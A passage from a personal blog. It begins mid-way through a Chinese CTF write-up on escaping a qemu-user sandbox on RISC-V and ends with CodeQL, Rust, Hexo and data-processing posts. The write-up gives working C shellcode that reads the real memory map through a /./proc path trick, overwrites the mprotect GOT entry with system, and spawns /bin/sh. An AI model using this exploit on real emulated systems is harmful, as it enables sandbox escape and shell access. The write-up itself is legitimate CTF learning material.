<p>之所以可以从qemu中逃逸出来，是因为qemu-user的内存布局跟主系统的内存布局有很紧密的联系。</p>
<p>经过测试，从qemu-user的沙箱里面，基本可以向qemu执行的程序之外的一定内存空间做任意地址读、任意地址写。</p>
<p>同样是利用上一题栈溢出的漏洞为基础继续做，只不过这次不读取<code>flag</code>，读取<code>/proc/self/maps</code>，查看内存情况。</p>
<p>本来想在gdb里面调试看内存的，结果看不见前面的内存。</p>
<p>{ % qnimg First-Presentation-in-Kap0k/vmmap1.png %}</p>
<p>msk师傅告诉我这是虚拟地址，确实是这样。</p>
<p>可以通过访问<code>/proc/self/maps</code>看到当前内存布局，结果发现看了个寂寞：</p>
<p>{ % qnimg First-Presentation-in-Kap0k/cat_maps_failed.png %}</p>
<p>有师傅去看了qemu的源码分析，发现原来是qemu塞了个假的内存分布信息给你。（你被骗了</p>
<p>师傅们有很多的解法，其中一种是改成<code>/./proc/self/maps</code>，就能得到正确的内存分布情况。</p>
<p>{ % qnimg First-Presentation-in-Kap0k/cat_maps_successfully.png %}</p>
<p>剩下的内容就是pwn的常规操作：</p>
<ol>
<li>通过实际内存分布信息，找到qemu的基地址和libc的基地址。</li>
<li>查偏移，查出<code>mprotect@got</code>，<code>system</code>和rodata的偏移，利用前面的两个基地址推出实际地址。</li>
<li>首先利用<code>mprotect</code>把rodata的一段内容改为可写，并在这段首写入<code>/bin/sh\x00</code>。</li>
<li>劫持<code>mprotect</code>的got表为<code>system</code>函数。</li>
<li>最后执行shellcode，调用<code>mprotect@got</code>，参数为rodata段首，执行<code>system(&quot;/bin/sh\x00&quot;)</code>。</li>
</ol>
<p>只不过这道题要劫持控制流，比较方便的方法还是使用ret2shellcode。</p>
<p>可以利用C生成出shellcode，下面是示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">int openat(int dirfd, char* pathname, int flags);</span><br><span class="line">int read(int fd, void *buf,int size);</span><br><span class="line">int write(int fd, void *buf, int size);</span><br><span class="line">int mprotect(void* addr, unsigned long len, int prot);</span><br><span class="line">void exit(int no);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">	char filename[32];</span><br><span class="line">	filename[0] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[1] &#x3D; &#39;.&#39;;</span><br><span class="line">	filename[2] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[3] &#x3D; &#39;p&#39;;</span><br><span class="line">	filename[4] &#x3D; &#39;r&#39;;</span><br><span class="line">	filename[5] &#x3D; &#39;o&#39;;</span><br><span class="line">	filename[6] &#x3D; &#39;c&#39;;</span><br><span class="line">	filename[7] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[8] &#x3D; &#39;s&#39;;</span><br><span class="line">	filename[9] &#x3D; &#39;e&#39;;</span><br><span class="line">	filename[10] &#x3D; &#39;l&#39;;</span><br><span class="line">	filename[11] &#x3D; &#39;f&#39;;</span><br><span class="line">	filename[12] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[13] &#x3D; &#39;m&#39;;</span><br><span class="line">	filename[14] &#x3D; &#39;a&#39;;</span><br><span class="line">	filename[15] &#x3D; &#39;p&#39;;</span><br><span class="line">	filename[16] &#x3D; &#39;s&#39;;</span><br><span class="line">	filename[17] &#x3D; &#39;\0&#39;;</span><br><span class="line"></span><br><span class="line">	unsigned char *buf &#x3D; (unsigned char*)0x6d000;</span><br><span class="line">	int fd &#x3D; openat(0, filename, 0);</span><br><span class="line">	read(fd, buf, 0xF80);</span><br><span class="line">	write(1, buf, 0xF80);</span><br><span class="line">	read(fd, buf, 0xF80);</span><br><span class="line">	write(1, buf, 0xF80);</span><br><span class="line">	read(fd, buf, 0xF80);</span><br><span class="line">	write(1, buf, 0xF80);</span><br><span class="line"></span><br><span class="line">	unsigned long rodata;</span><br><span class="line">	unsigned long mprotect_got;</span><br><span class="line">	unsigned long system_addr;</span><br><span class="line"></span><br><span class="line">	read(0, &amp;rodata, 8);</span><br><span class="line">	read(0, &amp;mprotect_got, 8);</span><br><span class="line">	read(0, &amp;system_addr, 8);</span><br><span class="line">	mprotect((void *)rodata, 0x3c000, 7);</span><br><span class="line"></span><br><span class="line">	*(unsigned long *)mprotect_got &#x3D; system_addr;</span><br><span class="line"></span><br><span class="line">	buf[0] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	buf[1] &#x3D; &#39;b&#39;;</span><br><span class="line">	buf[2] &#x3D; &#39;i&#39;;</span><br><span class="line">	buf[3] &#x3D; &#39;n&#39;;</span><br><span class="line">	buf[4] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	buf[5] &#x3D; &#39;s&#39;;</span><br><span class="line">	buf[6] &#x3D; &#39;h&#39;;</span><br><span class="line">	buf[7] &#x3D; &#39;\0&#39;;</span><br><span class="line"></span><br><span class="line">	mprotect(buf, 0x1000, 7);	&#x2F;&#x2F; this will call system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">	exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;openat:\n&quot;</span><br><span class="line">		&quot;li a7, 56\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;read:\n&quot;</span><br><span class="line">		&quot;li a7, 63\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;write:\n&quot;</span><br><span class="line">		&quot;li a7, 64\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;mprotect:\n&quot;</span><br><span class="line">		&quot;li a7, 226\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;exit:\n&quot;</span><br><span class="line">		&quot;li a7, 93\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br></pre></td></tr></table></figure>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/RISC-V">https://en.wikipedia.org/wiki/RISC-V</a></li>
<li><a target="_blank" rel="noopener" href="https://inst.eecs.berkeley.edu/~cs61c/resources/su18_lec/Lecture7.pdf">https://inst.eecs.berkeley.edu/~cs61c/resources/su18_lec/Lecture7.pdf</a></li>
<li><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/14/getshell2/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/14/getshell2/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/BrieflyX/ctf-pwns/tree/master/escape/favourite_architecture">https://github.com/BrieflyX/ctf-pwns/tree/master/escape/favourite_architecture</a></li>
<li><a target="_blank" rel="noopener" href="https://pullp.github.io/2021/01/23/starctf-2021-writeup/">https://pullp.github.io/2021/01/23/starctf-2021-writeup/</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/03/23/CodeQL-Learning-Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/23/CodeQL-Learning-Notes/" class="post-title-link" itemprop="url">CodeQL Learning Notes</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-03-23 23:25:23" itemprop="dateCreated datePublished" datetime="2021-03-23T23:25:23+08:00">2021-03-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-24 14:00:02" itemprop="dateModified" datetime="2021-03-24T14:00:02+08:00">2021-03-24</time>
              </span>

          
            <span id="/2021/03/23/CodeQL-Learning-Notes/" class="post-meta-item leancloud_visitors" data-flag-title="CodeQL Learning Notes" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/03/23/CodeQL-Learning-Notes/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/23/CodeQL-Learning-Notes/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="beginning"><a href="#beginning" class="headerlink" title="beginning"></a>beginning</h2><p>Why do I need to learn CodeQL? Emm… It’s all about SRP.</p>
<p>CodeQL is a query tool that powers security researchers, which consists of code scanning, vulnerbilities discovering, etc.</p>
<p>As for the reason, one of the requirements of SRP is to use CodeQL to develop a vulnerbilities scanning program. Personnally I think it’s a great challenge for me as I am not skilled at this field before. But I will try my best.</p>
<h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>I set up the environment on VSCode, Arch Linux, and the general configuration is simple:</p>
<ol>
<li><p>Download <code>CodeQL</code> extension in VSCode.</p>
</li>
<li><p>Let the extension automatically download CodeQL CLI.</p>
</li>
</ol>
<p>According to the official documentation, it is not recommended to manually set the path of executable in extension, because sometimes some nasty errors would occur.(but it seems nothing special?)</p>
<p>If you need to use CodeQL CLI outside VSCode, maybe you should manually install another one.</p>
<h2 id="First-Demo"><a href="#First-Demo" class="headerlink" title="First Demo"></a>First Demo</h2><p>There is a repository called <a target="_blank" rel="noopener" href="https://github.com/github/vscode-codeql-starter">vscode-codeql-starter</a> in GitHub, which you can use to run your first query in CodeQL locally.</p>
<p>What’s more, there is a learning repo available in GitHub called <a target="_blank" rel="noopener" href="https://github.com/github/codeql-uboot"><code>codeql-uboot</code></a>, which aims to use codeql to find 9 vulnerbilities about <code>memcpy</code>.</p>
<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;hello world&quot;</span><br></pre></td></tr></table></figure>
<h1 id="Basic-Grammar"><a href="#Basic-Grammar" class="headerlink" title="Basic Grammar"></a>Basic Grammar</h1><p>Similar to SQL, CodeQL has three essential keywords: <code>from</code>, <code>where</code>, <code>select</code>.</p>
<p>Let’s look through examples from <code>codeql-uboot</code>, whose code language is c++.</p>
<h2 id="Find-Function-Definitions"><a href="#Find-Function-Definitions" class="headerlink" title="Find Function Definitions"></a>Find Function Definitions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName() &#x3D; &quot;memcpy&quot;</span><br><span class="line">select f, &quot;a function named memcpy&quot;</span><br></pre></td></tr></table></figure>
<p>CodeQL has lots of useful APIs, which can be seen conveniently when using auto-completion in VSCode.</p>
<p>How to start a query? <code>Ctrl+Shift+P</code>, type <code>codeql</code>, select <code>Run Query</code>. After a while you can see the result in your right hand side.</p>
<h2 id="Find-Macro-Definitions"><a href="#Find-Macro-Definitions" class="headerlink" title="Find Macro Definitions"></a>Find Macro Definitions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from Macro m</span><br><span class="line">where m.getName() in [&quot;ntohs&quot;, &quot;ntohl&quot;, &quot;ntohll&quot;]</span><br><span class="line">select </span><br></pre></td></tr></table></figure>
<h2 id="Find-Function-Calls"><a href="#Find-Function-Calls" class="headerlink" title="Find Function Calls"></a>Find Function Calls</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from FunctionCall fc</span><br><span class="line">where fc.getTarget().getName() &#x3D; &quot;memcpy&quot;</span><br><span class="line">select fc</span><br></pre></td></tr></table></figure>
<h2 id="Find-Macro-Invocations"><a href="#Find-Macro-Invocations" class="headerlink" title="Find Macro Invocations"></a>Find Macro Invocations</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MacroInvocation inv</span><br><span class="line">where inv.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select inv</span><br></pre></td></tr></table></figure>
<h2 id="Find-Macro-Expressions"><a href="#Find-Macro-Expressions" class="headerlink" title="Find Macro Expressions"></a>Find Macro Expressions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MacroInvocation inv</span><br><span class="line">where inv.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select inv.getExpr()</span><br></pre></td></tr></table></figure>
<h2 id="Create-A-Class"><a href="#Create-A-Class" class="headerlink" title="Create A Class"></a>Create A Class</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists (MacroInvocation inv | </span><br><span class="line">      inv.getMacro().getName() in [&quot;ntohs&quot;, &quot;ntohl&quot;, &quot;ntohll&quot;] and </span><br><span class="line">      this &#x3D; inv.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from NetworkByteSwap n</span><br><span class="line">select n, &quot;Network byte swap&quot;</span><br></pre></td></tr></table></figure>
<h2 id="Data-Flow-in-CodeQL"><a href="#Data-Flow-in-CodeQL" class="headerlink" title="Data Flow in CodeQL"></a>Data Flow in CodeQL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists (MacroInvocation inv | </span><br><span class="line">      inv.getMacro().getName() in [&quot;ntohs&quot;, &quot;ntohl&quot;, &quot;ntohll&quot;] and </span><br><span class="line">      this &#x3D; inv.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123;</span><br><span class="line">    this &#x3D; &quot;Network2MemFuncLength&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.asExpr() instanceof NetworkByteSwap</span><br><span class="line">  &#125;</span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall fc |</span><br><span class="line">      sink.asExpr() &#x3D; fc.getArgument(2) and </span><br><span class="line">      fc.getTarget().hasQualifiedName(&quot;memcpy&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;Network byte swap flows to memory&quot;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/03/23/Rust-Programming-Language-Learning-Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/23/Rust-Programming-Language-Learning-Notes/" class="post-title-link" itemprop="url">Rust Programming Language Learning Notes</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-03-23 23:20:42" itemprop="dateCreated datePublished" datetime="2021-03-23T23:20:42+08:00">2021-03-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-24 14:00:09" itemprop="dateModified" datetime="2021-03-24T14:00:09+08:00">2021-03-24</time>
              </span>

          
            <span id="/2021/03/23/Rust-Programming-Language-Learning-Notes/" class="post-meta-item leancloud_visitors" data-flag-title="Rust Programming Language Learning Notes" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/03/23/Rust-Programming-Language-Learning-Notes/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/23/Rust-Programming-Language-Learning-Notes/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Recently I have looked through a new programming language called Rust(most of the time is spent in class).</p>
<p>It is quite interesting to try this new programming language, not only because of its advantages like good performance like C and safety, but also because of a brand-new way of thinking. Actually some unique properties of Rust are quite inspiring, but it turns out not easy to even get a program compiled due to the strict restriction of Rust compiler. However, I still think it’s worth a lot.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/03/18/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/18/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-03-18 21:26:59" itemprop="dateCreated datePublished" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
            </span>

          
            <span id="/2021/03/18/hello-world/" class="post-meta-item leancloud_visitors" data-flag-title="Hello World" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/03/18/hello-world/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/18/hello-world/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/03/15/NNI-Student-Program-2020-Task3.2.1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/15/NNI-Student-Program-2020-Task3.2.1/" class="post-title-link" itemprop="url">NNI Student Program Task3.2.1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-03-15 19:20:00" itemprop="dateCreated datePublished" datetime="2021-03-15T19:20:00+08:00">2021-03-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          
            <span id="/2021/03/15/NNI-Student-Program-2020-Task3.2.1/" class="post-meta-item leancloud_visitors" data-flag-title="NNI Student Program Task3.2.1" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/03/15/NNI-Student-Program-2020-Task3.2.1/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/15/NNI-Student-Program-2020-Task3.2.1/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Task-3-2-1-表格型数据的进阶任务"><a href="#Task-3-2-1-表格型数据的进阶任务" class="headerlink" title="Task 3.2.1 表格型数据的进阶任务"></a>Task 3.2.1 表格型数据的进阶任务</h1><h2 id="电影票房预测：TMDB-Box-Office-Prediction"><a href="#电影票房预测：TMDB-Box-Office-Prediction" class="headerlink" title="电影票房预测：TMDB Box Office Prediction"></a>电影票房预测：TMDB Box Office Prediction</h2><h3 id="特征处理"><a href="#特征处理" class="headerlink" title="特征处理"></a>特征处理</h3><p>首先，可以发现<code>belongs-to-collection</code>，<code>homepage</code>等特征存在缺失值，可根据具体数据类型使用不同策略填补缺失值，例如json数据填补<code>&#39;[]&#39;</code>，<code>runtime</code>用中位数填补等等。</p>
<p>其次，数据中存在异常值，需要人工删去异常数据或对异常数据进行填补，在这种时候，箱型图是很重要的工具。<code>budget</code>特征中，前25%的数据均是0，必然是异常数据，解决方案之一是用剩余<code>budget</code>数据的中位数来对其进行填补。<code>runtime</code>特征中存在338分钟的超长电影，打乱了<code>runtime</code>的规则分布，我们选择将该条数据从训练集中删去。</p>
<p><code>poster-path</code>、<code>imdb-id</code>特征一个是图片链接，一个是id，对模型没有任何直接关系，直接删去。</p>
<p>在两个数据中，<code>status</code>特征99.8%的数据都是Released，那么这个特征根本不能提高分类精确度，因此可以直接删去。</p>
